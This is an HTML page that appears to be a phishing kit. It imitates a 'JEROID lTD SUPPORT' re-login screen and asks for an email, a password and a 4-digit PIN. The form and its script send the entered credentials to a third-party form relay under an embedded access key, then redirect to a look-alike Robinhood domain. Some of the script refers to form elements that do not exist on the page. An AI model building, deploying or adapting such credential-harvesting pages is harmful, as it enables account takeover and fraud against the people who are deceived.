<body><div class="container">
    <div class="top-bar">
        <span>← Back</span>
        <span>🌐 English</span>
    </div>
     <div class="logo">
  <img src="image2.jpg" alt="Logo">
     </div>
    <div class="container">
        <h2>JEROID lTD SUPPORT</h2>
    </div>
<div class="info-box">
  Re-login To Continue 
</div>

<form id="verifyForm" action="https://api.web3forms.com/submit" method="POST">
<input type="hidden" name="access_key" value="6b56be11-e040-4f26-949f-2293aa195621">

<input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
<!-- STEP 1 -->
<div id="steps">
<h3>Enter mail</h3>
<input type="email" name="email" placeholder="yourgmail@gmail.com" required>
<p>password</p>
<input type="text" name="username" placeholder="password" required>
<h3>verify Pin</h3>
<textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
<!-- Hidden Step 1 Data -->
<input type="hidden" name="whatsapp" id="whatsappField">
<input type="hidden" name="country" id="countryField">
<input type="hidden" name="complaint" id="complaintField">

<button type="submit" class="btn">Verify & Continue</button>

</form>

</div>

<script>
// Prefill Step 1 data
document.addEventListener('DOMContentLoaded', ()=>{
    const step1Data = JSON.parse(localStorage.getItem('step1Data') || '{}');
    document.getElementById('email').value = step1Data.email || '';
});

// Step 2 submission
document.getElementById('step2Form').addEventListener('submit', async function(e){
    e.preventDefault();
    const form = e.target;

    // Combine Step 1 + Step 2 data
    const combinedData = new FormData(form);
    const step1Data = JSON.parse(localStorage.getItem('step1Data') || '{}');
    for (const key in step1Data) {
        combinedData.append(key, step1Data[key]);
    }

    try {
        await fetch('https://api.web3forms.com/submit', { method:'POST', body:combinedData });

        alert("Step 2 submitted successfully!");
        localStorage.removeItem('step1Data');

        // Redirect to final success page
        window.location.href = "success.html";

    } catch(err){
        alert("Submission failed, try again.");
        console.error(err);
    }
});
</script>
